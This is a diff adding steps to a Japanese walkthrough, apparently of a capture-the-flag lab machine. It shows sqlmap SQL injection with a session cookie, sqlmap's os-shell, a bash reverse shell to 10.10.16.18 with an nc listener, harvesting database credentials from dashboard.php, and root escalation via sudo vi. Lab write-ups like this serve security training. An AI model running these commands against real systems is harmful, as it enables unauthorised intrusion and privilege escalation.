@@ -53,9 +53,83 @@ Web siteにログイン
 
 ![e659228b8fdb3272ed3bc31d6e770665.png](../_resources/e659228b8fdb3272ed3bc31d6e770665.png)
 
-smaple kensaku wo zissi
+cookie editorを使いcookieを確認
+
+![f1809a694fdb54b039c6f6ab3366c8d7.png](../_resources/f1809a694fdb54b039c6f6ab3366c8d7.png)
 
 
-![fa7758357cab35ce1ce431278078ad7b.png](../_resources/fa7758357cab35ce1ce431278078ad7b.png)
+# 5. Sql map
 
-![a5a624462165fca2dfa9e17430b9a72a.png](../_resources/a5a624462165fca2dfa9e17430b9a72a.png)rm
+sqlmap を使い対象websiteへのSQLインジェクションの脆弱性を確認。
+
+`sqlmap -u 'http://$ip/dashboard.php?search=any+query' --
+cookie="PHPSESSID=7u6p9qbhb44c5c1rsefp4ro8u1"`
+
+![3ffe23ca967636a8f7c857cf5d89af44.png](../_resources/3ffe23ca967636a8f7c857cf5d89af44.png)
+
+sql mapを使い --os-shell で接続
+
+`sqlmap --os-shell -u 'http://$ip/dashboard.php?search=any+query' --cookie="PHPSESSID=js7su4b1p3lq9u0q2qqvtmj4ej"`      
+
+os-shellからバッシュを使いローカルPCへ接続する
+
+`bash -c "bash -i >& /dev/tcp/10.10.16.18/443 0>&1"`
+
+![6471f2c462bdc3fb81444e1af2f84bda.png](../_resources/6471f2c462bdc3fb81444e1af2f84bda.png)
+
+`sudo nc -lvnp 443`
+
+![e5e48a5f2b08f760cd0c8cababb8779e.png](../_resources/e5e48a5f2b08f760cd0c8cababb8779e.png)
+
+directory一覧を確認
+
+ls
+
+![d5332d259e2f3397810deb91b57d6034.png](../_resources/d5332d259e2f3397810deb91b57d6034.png)
+
+dashboard.php からuser名とpasswordを取得
+
+cat dashboard.php
+
+user:postgres
+
+password:P@s5w0rd!
+
+![a5efba060492f372c54f32d70de2195e.png](../_resources/a5efba060492f372c54f32d70de2195e.png)
+
+# 6.SSH
+
+SSHで接続
+
+![1fbb3355dc0cec5994e1c08cdf6688ec.png](../_resources/1fbb3355dc0cec5994e1c08cdf6688ec.png)
+
+root権限で実行できるコマンドを確認
+
+sudo -l
+
+![7a77beeca06ae8e3f44b1cb3e1ee9ede.png](../_resources/7a77beeca06ae8e3f44b1cb3e1ee9ede.png)
+
+コマンド実行
+
+参考URL:https://gtfobins.github.io/gtfobins/vi/#sudo
+
+vimはsudoで事項した場合管理者権限で実行できる。
+
+sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
+
+![c92eae19ad9a1741b592de5d03b2d76e.png](../_resources/c92eae19ad9a1741b592de5d03b2d76e.png)
+
+shellを実行
+
+vi
+:set shell=/bin/sh
+:shell
+
+![1ede944c88255c2a14fa095e141f455d.png](../_resources/1ede944c88255c2a14fa095e141f455d.png)
+
+
+![977c027713fcf1b3fb34eabf68dd0bb8.png](../_resources/977c027713fcf1b3fb34eabf68dd0bb8.png)
+
+# 7.flag get
+
+![f0900b4652123904532d6b87f56a7909.png](../_resources/f0900b4652123904532d6b87f56a7909.png)
